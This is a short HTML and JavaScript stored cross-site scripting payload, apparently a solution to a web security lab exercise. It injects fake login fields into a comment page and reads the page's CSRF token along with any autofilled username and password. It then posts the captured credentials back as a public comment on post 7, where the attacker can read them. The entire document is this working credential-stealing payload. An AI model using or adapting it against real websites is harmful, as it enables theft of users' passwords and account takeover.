<input name=username id=username>
<input type=password name=password onchange="payload()">
<script>
    //main function
    function payload(){
        
        
        //dom loaders
        let token = document.getElementsByName('csrf')[0].value;
        let username = document.getElementsByName("username")[0].value;
        let password= document.getElementsByName("password")[0].value;
        
        //dictionary
        let data = new FormData();
        //apend data to dictionary
        data.append('csrf',token);
        data.append('postId',7);
        data.append('comment',`${username} : ${password}`);
        data.append('name','asdw');
        data.append('email','asdw@gmail.com');
        data.append('website','http://asdw.com');

        fetch("/post/comment",{
            method:"POST",
            mode:"no-cors",
            body:data
        })
    }
</script>
